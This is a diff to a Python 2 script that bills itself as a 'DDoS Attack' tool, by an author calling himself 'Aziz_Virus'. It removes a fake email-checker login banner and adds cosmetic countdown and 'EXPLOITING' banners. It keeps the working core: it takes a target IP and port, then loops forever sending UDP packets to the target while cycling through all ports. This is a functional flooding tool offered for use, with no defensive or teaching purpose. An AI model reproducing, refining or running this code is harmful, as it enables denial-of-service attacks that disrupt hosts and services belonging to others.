@@ -56,60 +56,63 @@ def banner():
    print '------------------------------'
    print ' '
    print ' ' 
-   print '_______________________________________________________________________________'
-   print '|                                                                             |'
-   print '|                         *Email Checker Verification*                        |'
-   print '|_____________________________________________________________________________|'
-   print '|                                                                             |'
-   print '|                                                                             |'
-   print '|                                                                             |'
-   print '|                 User Name:          [     hacker    ]                       |'
-   print '|                                                                             |'
-   print '|                 Password:           [     ******    ]                       |'
-   print '|                                                                             |'
-   print '|                                                                             |'
-   print '|                              Say The Magic Word                             |'
-   print '|                                                                             |'
-   print '|                                   [ Login ]                                 |'
-   print '|_____________________________________________________________________________|'
-   print '|                                                                             |'
-   print '|               Bussiness Requires Only : Facebook: Aziz Bécha                |'
-   print '|_____________________________________________________________________________|'
-   print ' '
-   print ' '
-banner()
+banner()           
 print ' '
 print prompt + "Author   : Aziz_Virus"
 print prompt + "github   : https://github.com/AzizVirus"
 print prompt + "Facebook : Aziz Bécha"
 print ' '
-ip = raw_input(prompt + "  {*} Select The IP Target : ")
+ip = raw_input(prompt + "{*} Select The IP Target : ")
 time.sleep(0.25)
 print ' '
-print prompt + '  {+} IP succesfully selected ! ==> ' + ip
+print prompt + '{+} IP succesfully selected ! ==> ' + ip
 print ' '
-port = input(prompt + "  {*} Select The Port       : ")
-print prompt + '  {+} Everything Now IS OK! '
+port = input(prompt + "(" + ip +  ")" + " > " +  "{*} Select The Port       : ")
+print prompt + "(" + ip + ")" + " > " +  "{+} Port Selected ! " 
+print prompt + "(" + ip + ")" + " > " + "{+} Everything Now IS OK! "
 print ' '
 os.system("clear")
 os.system("figlet Starting Attack ")
 print ' '
-print prompt + "[                    ] 0% "
-time.sleep(0.5)
-print prompt + "[=====               ] 25%"
-time.sleep(0.5)
-print prompt + "[==========          ] 50%"
-time.sleep(0.5)
-print prompt + "[===============     ] 75%"
-time.sleep(0.5)
-print prompt + "[====================] 100%"
+print prompt + "(" + ip + ")" + " > " +  "[                    ] 0% "
+time.sleep(0.25)
+print prompt + "(" + ip + ")" + " > " +  "[=====               ] 25%"
+time.sleep(0.25)
+print prompt + "(" + ip + ")" + " > " +  "[==========          ] 50%"
+time.sleep(0.25)
+print prompt + "(" + ip + ")" + " > " +  "[===============     ] 75%"
+time.sleep(0.25)
+print prompt + "(" + ip + ")" + " > " +  "[====================] 100%"
+print " "
+print " "
+time.sleep (1.5)
+
+print bcolors.FAIL + '|-------------===[***'                                                                                                                                        
+print bcolors.FAIL + '|EXPLOITING ' +ip+ '\ '                                                                                                                                        
+print bcolors.FAIL + '|_____________\_______ '                                                                                                                                       
+print bcolors.FAIL + ('|==[ DDoS Attack ]===\.')                                                                                                                                          
+print bcolors.FAIL + '|______________________\    '                                                                                                                                      
+print bcolors.FAIL + '\(@)(@)(@)(@)(@)(@)(@)_/     '                                                                                                                                      
+print bcolors.FAIL + '********************* \_     '
+print ' '
+print ' '
+time.sleep (0.75)
+print prompt + 'Attack Starts After 3'
+print ' '
 time.sleep(1)
+print prompt + 'Attack Starts After 2'
+print ' '
+time.sleep(1)
+print prompt + 'Attack Starts After 1'
+print ' '
+time.sleep(1)
+print prompt + ' Started!'
+time.sleep(0.75)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print prompt + "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print prompt + "(" + ip + ")" + " > " + " [+] Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
